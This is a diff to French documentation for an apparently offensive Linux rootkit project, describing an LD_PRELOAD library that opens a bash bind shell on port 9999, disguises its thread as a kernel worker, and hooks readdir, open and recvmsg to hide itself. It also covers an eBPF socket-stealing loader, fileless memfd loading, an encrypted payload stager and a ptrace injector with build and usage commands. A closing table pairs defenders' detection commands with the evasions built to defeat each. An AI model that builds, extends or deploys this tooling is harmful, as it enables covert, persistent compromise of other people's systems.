@@ -2,6 +2,24 @@
 
 ---
 
+## `config.h` — Configuration centralisée
+
+### Description
+Header commun définissant toutes les constantes du projet. Facilite la modification des paramètres globaux (ports, paths, noms).
+
+### Constantes principales
+```c
+#define GHOST_PORT          9999    // Port d'écoute principal
+#define SURVIVAL_PORT       8888    // Port du daemon de survie
+#define KILL_SWITCH         "/tmp/.ghost_off"
+#define FAKE_THREAD_NAME    "[kworker/u24:5]"
+#define UNIX_BRIDGE        "ghost_bridge"
+#define BPF_OBJ_PATH        "ghost.bpf.o"
+#define GHOST_SO_NAME       "libghost"
+```
+
+---
+
 ## `ghost_lib.c` / `hijack.so` — Backdoor + Rootkit LD_PRELOAD
 
 ### Description
@@ -12,14 +30,15 @@ Bibliothèque partagée constituant le cœur du projet. Injectée via `LD_PRELOA
 #### Thread `ghost_listener`
 ```
 socket() → bind(:9999) → listen() → [boucle]
-    ↓ select() avec timeout 1s (pour vérifier le kill switch)
+    ↓ select() avec timeout 2s (vérification kill switch + non-bloquant)
     ↓ accept() → fork()
-        ↓ (enfant) dup2() sur stdin/stdout/stderr → execl("/bin/bash")
+        ↓ (enfant) dup2() → unsetenv(LD_PRELOAD) → execl("/bin/bash")
 ```
-- Le port d'écoute est `9999` (défini par `BIND_PORT`)
+- Le port d'écoute est `9999` (défini par `GHOST_PORT` dans config.h)
 - `FD_CLOEXEC` sur le socket serveur : évite l'héritage par le bash enfant
-- **Kill switch** : si `/tmp/.ghost_off` existe, `kill(0, SIGTERM)` + `exit(0)`
+- **Kill switch** : si `/tmp/.ghost_off` existe, le thread s'arrête proprement
 - Masquage du nom de thread : `prctl(PR_SET_NAME, "[kworker/u24:5]")`
+- Détection du processus cible via `/proc/self/exe` (plus sécurisé que `/proc/self/comm`)
 
 #### Hook `readdir()`
 - Intercepte l'énumération de `/proc/self/fd/`
@@ -35,9 +54,22 @@ socket() → bind(:9999) → listen() → [boucle]
 - Force `SO_REUSEADDR | SO_REUSEPORT` sur tout appel `bind()` du processus
 - Évite les erreurs "Address already in use"
 
-#### Constructeur `init_ghost()`
-- Appelé automatiquement au chargement de la bibliothèque
-- Lance `ghost_listener` dans un thread détaché (`PTHREAD_CREATE_DETACHED`)
+#### Hook `open()` — NOUVEAU
+- Intercepte les ouvertures de `/proc/self/maps` et `/proc/self/environ`
+- Génère des versions filtrées dans `/tmp/.ghost_maps_<pid>` et `/tmp/.ghost_environ_<pid>`
+- Filtre :
+  - Lignes contenant le nom de la lib (`GHOST_SO_NAME`)
+  - Lignes contenant des paths `/tmp/` avec `.so`
+  - Variable `LD_PRELOAD=` dans l'environnement
+
+#### Constructeur/Destructeur
+- `__attribute__((constructor))` `init_ghost()` : lance le thread listener
+- `__attribute__((destructor))` `cleanup_ghost()` : fermeture propre du socket
+
+### Gestion d'erreurs
+- Toutes les fonctions de la libc sont résolues via `dlsym(RTLD_NEXT, ...)`
+- Vérification systématique des retours d'appels système
+- Variables statiques initialisées à NULL, résolution lazy
 
 ### Compilation
 ```bash
@@ -81,18 +113,26 @@ Programme userland qui charge l'objet BPF compilé, crée un socket fantôme, l'
 
 ### Flux d'exécution
 ```
-bpf_object__open_file("ghost.bpf.o")
+bpf_object__open_file(BPF_OBJ_PATH)
     ↓
 bpf_object__load()
     ↓
 Création d'un socket fantôme (AF_INET, SOCK_STREAM)
     ↓
+setsockopt(SO_ATTACH_BPF) → attachement SOCKMAP
+    ↓
 bpf_map_update_elem(ghost_sock_map, 0, socket_fd)
     ↓
 bpf_prog_attach(prog_fd, netns_fd, BPF_SK_LOOKUP)
     ↓
-send_fd() → envoi du FD via SCM_RIGHTS sur socket Unix abstrait "ghost_bridge"
+send_fd() → envoi du FD via SCM_RIGHTS sur socket Unix abstrait
 ```
+
+### Corrections appliquées
+- Utilisation de `SO_ATTACH_BPF` via `setsockopt()` au lieu de store direct
+- Cleanup complet de tous les FDs en fin de programme
+- Utilisation des constantes depuis `config.h`
+- Gestion d'erreurs à chaque étape
 
 ### Transfert de FD (SCM_RIGHTS)
 - Socket Unix abstrait (chemin `\0ghost_bridge`)
@@ -120,7 +160,7 @@ accept() → receive_fd() → ghost_sk obtenu
 
 ---
 
-## `fileless_loader.c` — Chargement .so sans fichier disque
+## `evador.c` — Chargement .so sans fichier disque
 
 ### Description
 Démonstrateur du chargement d'une bibliothèque partagée en mémoire via `memfd_create()`, sans jamais créer de fichier sur le système de fichiers.
@@ -133,13 +173,66 @@ memfd_create("ghost_lib", MFD_CLOEXEC) → fd anonyme en RAM
     ↓
 write(fd, buffer, size)
     ↓
+lseek(fd, 0, SEEK_SET) → repositionnement
+    ↓
 dlopen("/proc/self/fd/<fd>", RTLD_NOW | RTLD_GLOBAL)
     ↓
 close(fd) — le mapping reste actif tant que la lib est chargée
 ```
 
+### Corrections appliquées
+- Vérification complète des retours de `open()`, `lseek()`, `read()`, `write()`
+- Allocation mémoire avec vérification (`malloc`)
+- `keep_alive_handle` static pour maintenir la lib chargée
+- Messages d'erreur explicites
+
 - `MFD_CLOEXEC` : le FD est fermé automatiquement lors d'un `exec()`
 - Le fichier n'apparaît pas dans `lsof` ni dans les listings du système de fichiers
+
+---
+
+## `injector.c` — Injection ptrace complète
+
+### Description
+Implémentation complète de l'injection d'une bibliothèque partagée dans un processus distant via l'API `ptrace`.
+
+### Principe
+```
+ptrace(PTRACE_ATTACH, pid)
+    ↓
+waitpid() → attente que le processus s'arrête
+    ↓
+ptrace(PTRACE_GETREGS) → sauvegarde des registres originaux
+    ↓
+Injection du chemin .so dans la mémoire du processus cible (PTRACE_POKEDATA)
+    ↓
+Modification de RIP → pointe sur dlopen()
+    RDI = adresse du chemin injecté, RSI = RTLD_LAZY
+    ↓
+ptrace(PTRACE_CONT) → exécution du dlopen
+    ↓
+Attente courte (usleep)
+    ↓
+Restauration des registres originaux
+ptrace(PTRACE_DETACH)
+```
+
+### Corrections appliquées
+- Validation des paramètres (pid > 0, chemin < MAX_PATH)
+- Résolution de `dlopen` dans le processus local (pas de fuite d'adresse)
+- Gestion d'erreurs complète à chaque étape ptrace
+- Sauvegarde/restauration propre des registres
+- Programme principal avec usage() et gestion de paramètres
+
+### Compilation
+```bash
+gcc injector.c -o injector -ldl
+```
+
+### Usage
+```bash
+./injector <pid> /chemin/vers/lib.so
+```
 
 ---
 
@@ -161,7 +254,7 @@ output = nonce + ciphertext
 
 ### Usage
 ```bash
-python3 encrypt_payload.py
+python3 encrypt_payload.py hijack.so
 # Affiche la clé hex à conserver pour le déchiffrement
 ```
 
@@ -187,6 +280,19 @@ LIBC.write(fd, data, len)
 LIBDL.dlopen("/proc/self/fd/<fd>", RTLD_NOW | RTLD_GLOBAL)
     ↓
 LIBC.close(fd)  — lib reste mappée
+```
+
+### Corrections appliquées
+- Arguments CLI (`-p/--payload`, `-k/--key`)
+- Validation de la clé hexadécimale
+- Vérification de la taille du payload
+- Gestion d'erreurs avec `use_errno=True`
+- Messages d'erreur explicites
+- Vérification des retours de `memfd_create`, `write`, `dlopen`
+
+### Usage
+```bash
+python3 stager.py -p payload.so.enc -k <cle_hex_64_chars>
 ```
 
 ### Dépendances
@@ -312,29 +418,28 @@ Actions :
 - `pkill -9 -f "kworker/u24:5"` → arrêt du thread masqué
 - `unset LD_PRELOAD` → suppression de l'injection dans le shell courant
 - `rm -f /tmp/.ghost_off` → suppression du kill switch (si présent)
+- `rm -f /tmp/.ghost_*` → nettoyage des fichiers temporaires de filtrage
 
 ---
 
-## `ptrace_inject.c` — Injection ptrace
+## Annexe : Détection et contre-mesures
 
-### Description
-Démonstration (partielle) de l'injection d'une bibliothèque partagée dans un processus distant via l'API `ptrace`.
+### Vecteurs de détection Blue Team
 
-### Principe
-```
-ptrace(PTRACE_ATTACH, pid)
-    ↓
-ptrace(PTRACE_GETREGS) → sauvegarde des registres
-    ↓
-Injection du chemin .so dans la mémoire du processus cible
-    ↓
-Modification de RIP → pointe sur dlopen()
-RDI = adresse du chemin, RSI = RTLD_LAZY
-    ↓
-ptrace(PTRACE_CONT) → exécution du dlopen
-    ↓
-Attente du SIGTRAP → restauration des registres
-ptrace(PTRACE_DETACH)
-```
+| Outil | Commande de détection |
+|---|---|
+| LD_PRELOAD | `grep -r LD_PRELOAD /proc/*/environ` |
+| Maps | `grep -r '/tmp' /proc/*/maps \| grep '\.so'` |
+| Thread kworker | `ps -eo pid,ppid,user,comm \| grep kworker` |
+| BPF | `bpftool prog list` |
+| Systemd | `systemctl --user list-units` |
 
-> Note : L'implémentation fournie est une démonstration pédagogique. Une injection réelle nécessite la gestion complète de la mémoire distante (`PTRACE_PEEKDATA`/`POKEDATA`) et un shellcode intermédiaire.
+### Contre-mesures implémentées
+
+| Détection | Contre-mesure |
+|---|---|
+| `/proc/environ` | Hook `open()` filtrant `LD_PRELOAD=` |
+| `/proc/maps` | Hook `open()` filtrant les lignes `.so` |
+| `ss` / `netstat` | Hook `recvmsg()` filtrant les ports Netlink |
+| `/proc/<pid>/fd` | Hook `readdir()` masquant le FD |
+| `ps` / `top` | `prctl(PR_SET_NAME, "[kworker/u24:5]")` |
